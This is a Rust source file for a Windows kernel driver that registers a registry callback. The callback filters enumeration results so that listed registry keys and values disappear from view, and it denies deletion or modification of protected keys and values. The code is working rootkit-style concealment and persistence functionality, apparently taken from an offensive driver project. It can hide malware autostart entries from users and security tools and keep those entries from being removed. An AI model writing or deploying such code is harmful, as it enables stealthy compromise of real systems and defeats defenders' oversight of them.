#![allow(non_upper_case_globals)]

use {
    log::error,
    alloc::{format, string::String}, 
    core::{ffi::c_void, ptr::null_mut},
    wdk_sys::{
        *,
        ntddk::{
            ObOpenObjectByPointer, ZwClose,
            CmCallbackGetKeyObjectIDEx, CmCallbackReleaseKeyObjectIDEx,
        }, 
        _MODE::KernelMode, 
        _REG_NOTIFY_CLASS::{
            RegNtPreQueryKey, RegNtPreSetValueKey,
            RegNtPreDeleteKey, RegNtPreDeleteValueKey, 
            RegNtPostEnumerateKey, RegNtPostEnumerateValueKey, 
        },
    },
};

use {
    super::{
        HIDE_KEYS, 
        HIDE_KEY_VALUES, 
        PROTECTION_KEYS,
        PROTECTION_KEY_VALUES,
        utils::{
            check_key_value, enumerate_value_key, 
            RegistryInfo
        }, 
    }, 
    crate::{
        utils::{pool::PoolMemory, valid_kernel_memory},
        registry::{
            Registry,
            utils::{check_key, enumerate_key}, 
        }, 
    },
};

/// Handle for Registry Callback.
pub static mut CALLBACK_REGISTRY: LARGE_INTEGER = unsafe { core::mem::zeroed() };

/// The registry callback function handles registry-related operations based on the notification class.
///
/// # Arguments
/// 
/// * `_callback_context` - A pointer to the callback context, usually not used.
/// * `argument1` - A pointer to the notification class.
/// * `argument2` - A pointer to the information related to the registry operation.
///
/// # Returns
/// 
/// * A status code indicating the result of the operation.
pub unsafe extern "C" fn registry_callback(
    _callback_context: *mut c_void,
    argument1: *mut c_void,
    argument2: *mut c_void,
) -> NTSTATUS {
    let status;

    let reg_notify_class = argument1 as i32;
    match reg_notify_class {
        RegNtPreSetValueKey => {
            status = pre_set_value_key(argument2 as *mut REG_SET_VALUE_KEY_INFORMATION);
        },
        RegNtPreDeleteValueKey => {
            status = pre_delete_value_key(argument2 as *mut REG_DELETE_VALUE_KEY_INFORMATION);
        },
        RegNtPreDeleteKey => {
            status = pre_delete_key(argument2 as *mut REG_DELETE_KEY_INFORMATION);
        },
        RegNtPreQueryKey => {
            status = pre_query_key(argument2 as *mut REG_QUERY_KEY_INFORMATION);
        },
        RegNtPostEnumerateKey => {
            status = post_enumerate_key(argument2 as *mut REG_POST_OPERATION_INFORMATION);
        },
        RegNtPostEnumerateValueKey => {
            status = post_enumerate_key_value(argument2 as *mut REG_POST_OPERATION_INFORMATION);
        }
        _ => return STATUS_SUCCESS,
    }

    status
}   

/// Handles the pre-delete key operation.
///
/// # Arguments
/// 
/// * `info` - A pointer to `REG_DELETE_KEY_INFORMATION`.
///
/// # Returns
/// 
/// * A status code indicating success or failure.
unsafe fn pre_delete_key(info: *mut REG_DELETE_KEY_INFORMATION) -> NTSTATUS {
    let status;
    if info.is_null() || (*info).Object.is_null() || !valid_kernel_memory((*info).Object as u64) {
        return STATUS_SUCCESS;
    }

    let key = match read_key(info) {
        Ok(key) => key,
        Err(err) => return err
    };

    status = if Registry::check_key(key, PROTECTION_KEYS.lock()) {
        STATUS_ACCESS_DENIED
    } else {
        STATUS_SUCCESS
    };

    status
}

/// Performs the post-operation to enumerate registry key values.
///
/// # Arguments
/// 
/// * `info` - Pointer to the information structure of the post-execution logging operation.
///
/// # Returns
/// 
/// * Returns the status of the operation. If the key value is found and handled correctly, returns `STATUS_SUCCESS`.
unsafe fn post_enumerate_key_value(info: *mut REG_POST_OPERATION_INFORMATION) -> NTSTATUS {
    if !NT_SUCCESS((*info).Status) {
        return (*info).Status
    }

    let key = match read_key(info) {
        Ok(key) => key,
        Err(err) => return err
    };

    if !check_key_value(info, key.clone()) {
        return STATUS_SUCCESS
    }

    let pre_info = match ((*info).PreInformation as *mut REG_ENUMERATE_VALUE_KEY_INFORMATION).as_ref() {
        Some(pre_info) => pre_info,
        None => return STATUS_SUCCESS,
    };

    let mut key_handle = null_mut();
    let status = ObOpenObjectByPointer(
        (*info).Object,
        OBJ_KERNEL_HANDLE,
        null_mut(),
        KEY_ALL_ACCESS,
        *CmKeyObjectType,
        KernelMode as i8,
        &mut key_handle
    );

    if !NT_SUCCESS(status) {
        error!("ObOpenObjectByPointer Failed With Status: {status}");
        return STATUS_SUCCESS;
    }

    let buffer = match PoolMemory::new(POOL_FLAG_NON_PAGED, (*pre_info).Length as u64, u32::from_be_bytes(*b"jdrf")) {
        Some(mem) => mem.ptr as *mut u8,
        None => {
            error!("PoolMemory (Enumerate Key) Failed");
            ZwClose(key_handle);
            return STATUS_SUCCESS;
        }
    };

    let mut result_length = 0;
    let mut counter = 0;

    while let Some(value_name) = enumerate_value_key(
        key_handle, 
        pre_info.Index + counter, 
        buffer, 
        (*pre_info).Length, 
        (*pre_info).KeyValueInformationClass, 
        &mut result_length
    ) {
        if !Registry::check_target(key.clone(), value_name.clone(), HIDE_KEY_VALUES.lock()) {
            if let Some(pre_info_key_info) = (pre_info.KeyValueInformation as *mut c_void).as_mut() {
                *(*pre_info).ResultLength = result_length;
                core::ptr::copy_nonoverlapping(buffer, pre_info_key_info as *mut _ as *mut u8, result_length as usize);
                break;
            } else {
                error!("Failed to copy key information.");
                break;
            }
        } else {
            counter += 1;
        }
    }

    ZwClose(key_handle);
    STATUS_SUCCESS
}

/// Performs the post-operation to enumerate registry keys.
///
/// # Arguments
/// 
/// * `info` - Pointer to the information structure of the post-execution logging operation.
///
/// # Returns
/// 
/// * Returns the status of the operation, keeping the original status if the previous operation failed.
unsafe fn post_enumerate_key(info: *mut REG_POST_OPERATION_INFORMATION) -> NTSTATUS {
    if !NT_SUCCESS((*info).Status) {
        return (*info).Status
    }

    let key = match read_key(info) {
        Ok(key) => key,
        Err(err) => return err
    };

    if !check_key(info, key.clone()) {
        return STATUS_SUCCESS
    }

    let pre_info = match ((*info).PreInformation as *mut REG_ENUMERATE_KEY_INFORMATION).as_ref() {
        Some(pre_info) => pre_info,
        None => return STATUS_SUCCESS,
    };

    let mut key_handle = null_mut();
    let status = ObOpenObjectByPointer(
        (*info).Object,
        OBJ_KERNEL_HANDLE,
        null_mut(),
        KEY_ALL_ACCESS,
        *CmKeyObjectType,
        KernelMode as i8,
        &mut key_handle
    );

    if !NT_SUCCESS(status) {
        error!("ObOpenObjectByPointer Failed With Status: {status}");
        return STATUS_SUCCESS;
    }

    let buffer = match PoolMemory::new(POOL_FLAG_NON_PAGED, (*pre_info).Length as u64, u32::from_be_bytes(*b"jdrf")) {
        Some(mem) => mem.ptr as *mut u8,
        None => {
            error!("PoolMemory (Enumerate Key) Failed");
            ZwClose(key_handle);
            return STATUS_SUCCESS;
        }
    };

    let mut result_length = 0;
    let mut counter = 0;

    while let Some(key_name) = enumerate_key(
        key_handle, 
        pre_info.Index + counter, 
        buffer, 
        (*pre_info).Length, 
        (*pre_info).KeyInformationClass, 
        &mut result_length
    ) {
        if !Registry::check_key(format!("{key}\\{key_name}"), HIDE_KEYS.lock()) {
            if let Some(pre_info_key_info) = (pre_info.KeyInformation as *mut c_void).as_mut() {
                *(*pre_info).ResultLength = result_length;
                core::ptr::copy_nonoverlapping(buffer, pre_info_key_info as *mut _ as *mut u8, result_length as usize);
                break;
            } else {
                error!("Failed to copy key information.");
                break;
            }

        } else {
            counter += 1;
        }
    }

    ZwClose(key_handle);
    STATUS_SUCCESS
}

/// Handles the pre-query key operation.
///
/// # Arguments
/// 
/// * `info` - A pointer to `REG_QUERY_KEY_INFORMATION`.
///
/// # Returns
/// 
/// * A status code indicating success or failure.
unsafe fn pre_query_key(info: *mut REG_QUERY_KEY_INFORMATION) -> NTSTATUS {
    let status;
    if info.is_null() || (*info).Object.is_null() || !valid_kernel_memory((*info).Object as u64) {
        return STATUS_SUCCESS;
    }

    let key = match read_key(info) {
        Ok(key) => key,
        Err(err) => return err
    };

    status = if Registry::check_key(key.clone(), HIDE_KEYS.lock()) {
        STATUS_SUCCESS
    } else {
        STATUS_SUCCESS
    };

    status
}

/// Handles the pre-delete value key operation.
///
/// # Arguments
/// 
/// * `info` - A pointer to `REG_DELETE_VALUE_KEY_INFORMATION`.
///
/// # Returns
/// 
/// * A status code indicating success or failure.
unsafe fn pre_delete_value_key(info: *mut REG_DELETE_VALUE_KEY_INFORMATION) -> NTSTATUS {
    if info.is_null() || (*info).Object.is_null() || !valid_kernel_memory((*info).Object as u64) {
        return STATUS_SUCCESS;
    }

    let key = match read_key(info) {
        Ok(key) => key,
        Err(err) => return err
    };

    let value_name = (*info).ValueName;
    if (*info).ValueName.is_null() || (*value_name).Buffer.is_null() || (*value_name).Length == 0 || !valid_kernel_memory((*value_name).Buffer as u64) {
        return STATUS_SUCCESS;
    }

    let buffer = core::slice::from_raw_parts((*value_name).Buffer, ((*value_name).Length / 2) as usize);
    let name = String::from_utf16_lossy(buffer);
    if Registry::<(String, String)>::check_target(key.clone(), name.clone(), PROTECTION_KEY_VALUES.lock()) {
        STATUS_ACCESS_DENIED
    } else {
        STATUS_SUCCESS
    }
}

/// Handles the pre-set value key operation.
///
/// # Arguments
/// 
/// * `info` - A pointer to `REG_SET_VALUE_KEY_INFORMATION`.
///
/// # Returns
/// 
/// * A status code indicating success or failure.
unsafe fn pre_set_value_key(info: *mut REG_SET_VALUE_KEY_INFORMATION) -> NTSTATUS {
    if info.is_null() || (*info).Object.is_null() || !valid_kernel_memory((*info).Object as u64) {
        return STATUS_SUCCESS;
    }

    let key = match read_key(info) {
        Ok(key) => key,
        Err(err) => return err
    };

    let value_name = (*info).ValueName;
    if (*info).ValueName.is_null() || (*value_name).Buffer.is_null() || (*value_name).Length == 0 || !valid_kernel_memory((*value_name).Buffer as u64) {
        return STATUS_SUCCESS;
    }

    let buffer = core::slice::from_raw_parts((*value_name).Buffer,((*value_name).Length / 2) as usize);
    let name = String::from_utf16_lossy(buffer);
    if Registry::check_target(key.clone(), name.clone(), PROTECTION_KEY_VALUES.lock()) {
        STATUS_ACCESS_DENIED
    } else {
        STATUS_SUCCESS
    }
}

/// Reads the key name from the registry information.
///
/// # Arguments
/// 
/// * `info` - A pointer to the registry information.
///
/// # Returns
/// 
/// * `Ok(String)` - The key name.
/// * `Err(NTSTATUS)` - error status.
unsafe fn read_key<T: RegistryInfo>(info: *mut T) -> Result<String, NTSTATUS> {
    let mut reg_path: PCUNICODE_STRING = core::ptr::null_mut();
    let status = CmCallbackGetKeyObjectIDEx(
        core::ptr::addr_of_mut!(CALLBACK_REGISTRY), 
        (*info).get_object(), 
        null_mut(), 
        &mut reg_path, 
        0
    );

    if !NT_SUCCESS(status) {
        return Err(STATUS_SUCCESS)
    }

    if reg_path.is_null() || (*reg_path).Buffer.is_null() || (*reg_path).Length == 0 || !valid_kernel_memory((*reg_path).Buffer as u64) {
        CmCallbackReleaseKeyObjectIDEx(reg_path);
        return Err(STATUS_SUCCESS);
    } 

    let buffer = core::slice::from_raw_parts((*reg_path).Buffer, ((*reg_path).Length / 2) as usize);
    let name = String::from_utf16_lossy(buffer);

    CmCallbackReleaseKeyObjectIDEx(reg_path);

    Ok(name)
}
